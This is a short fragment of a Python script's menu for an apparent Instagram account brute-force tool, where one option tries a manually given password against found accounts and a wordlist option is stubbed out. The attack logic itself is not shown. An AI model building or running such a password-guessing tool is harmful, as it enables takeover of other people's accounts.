            finder = InstagramFollowersFinder()
            finder.find_and_bruteforce_with_manual_password(
                manual_password=manual_password,
                delay=1.0
            )
            break
            
        elif choice == '2':
            print("\n[+] Starting Wordlist Mode...")
            # finder = InstagramFollowersFinder()
            # finder.find_and_bruteforce_accounts_continuous(
            #     delay=1.0,
            #     max_bruteforce_attempts=100
            # )
            print("[+] Malas Ngoding.")
            break
            
        else:
            print("[!] Please choose 1 or 2")

if __name__ == "__main__":
    main_menu()
